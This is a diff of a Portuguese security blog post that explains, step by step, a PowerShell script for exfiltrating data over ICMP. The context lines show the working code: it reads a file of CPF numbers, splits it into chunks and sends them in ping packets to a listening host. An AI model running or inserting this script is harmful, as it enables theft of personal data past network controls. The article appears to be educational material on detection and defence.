@@ -13,7 +13,7 @@ series:
  - Casos de Uso
 categories:
  - PowerShell
- - Exfiltração de Dados
+ - Exfiltração
 tags:
  - ICMP
  - MITRE ATT&CK
@@ -32,7 +32,6 @@ images:
 #         name: book
 #         color: '#e24d0e'
 ---
-
 ## !!!DISCLAIMER!!!
 
 **O uso dessas ferramentas e métodos abordados aqui contra redes para os quais você não possui permissão explícita é ilegal e pode resultar em consequências legais. É sua responsabilidade garantir que você tenha autorização apropriada antes de realizar qualquer teste. O uso inadequado pode causar danos e resultar em penalidades severas. Ao utilizar essas informações, você concorda em assumir total responsabilidade por suas ações. Lembre-se! Isto é apenas um artigo técnico para fins educacionais.**
@@ -55,7 +54,7 @@ Além disso, o PowerShell, por ser uma ferramenta administrativa legítima, est�
 
 O script apresentado é relativamente simples, mas extremamente eficiente. Vamos entender por partes:
 
-```powershell {title="ping_exfiltration.ps1"}
+```powershell
 $filePath = 'F:/cpf.txt'
 $binaryData = [System.IO.File]::ReadAllBytes($filePath)
 $ping = New-Object System.Net.NetworkInformation.Ping
@@ -68,12 +67,13 @@ $chunkSize = 50000
 
 **3. Definição do Tamanho dos Pacotes:** O script define o tamanho de cada chunk de dados que será enviado via ICMP. Neste caso, o valor é 50.000 bytes. Nos meus testes, o valor de 50.000 bytes foi suficiente para enviar uma lista de CPFs de 500 linhas em um único envio, só que na recepção dos logs, no tcpdump, ele veio em partes, mas mesmo assim eu recebi os CPFs completos. Iremos entender um pouco melhor mais a frente.
 
-```powershell {title="ping_exfiltration.ps1"}
+```powershell
 for ($i = 0; $i -lt $binaryData.Length; $i += $chunkSize) {
     $chunk = $binaryData[$i..[math]::Min($i + $chunkSize - 1, $binaryData.Length - 1)]
     $ping.Send('192.168.145.30', 1500, $chunk)
 }
 ```
+
 **4. Fragmentação dos Dados:** A cada iteração do loop `for`, uma parte (`chunk`) do arquivo binário é selecionada para ser enviada. A função `[math]::Min` garante que o script não tente ler além do final do array de bytes.
 
 **5. Envio Via Ping:** Cada `chunk` é então enviado via o método `Send` do objeto `Ping`. Aqui, o IP de destino (`192.168.145.30`) representa a máquina que está recebendo os dados e lá está com o `tcpdump` ativo escutando pacotes `icmp` na rede. O tempo limite para a resposta do ping é definido como 1500 ms.
@@ -149,7 +149,9 @@ Este tipo de ataque enfatiza a importância de uma estratégia de defesa em prof
 - [ICMP Ping Data Exfiltration](https://medium.com/@sam.rothlisberger/icmp-echo-request-data-exfiltration-f41f59fcf87a)
 
 ---
+
 <!-- begin wwww.htmlcommentbox.com -->
-  <div id="HCB_comment_box"><a href="http://www.htmlcommentbox.com">Widget</a> is loading comments...</div>
+
+<div id="HCB_comment_box"><a href="http://www.htmlcommentbox.com">Widget</a> is loading comments...</div>
  <link rel="stylesheet" type="text/css" href="https://www.htmlcommentbox.com/static/skins/bootstrap/twitter-bootstrap.css?v=0" />
 <!-- end www.htmlcommentbox.com -->
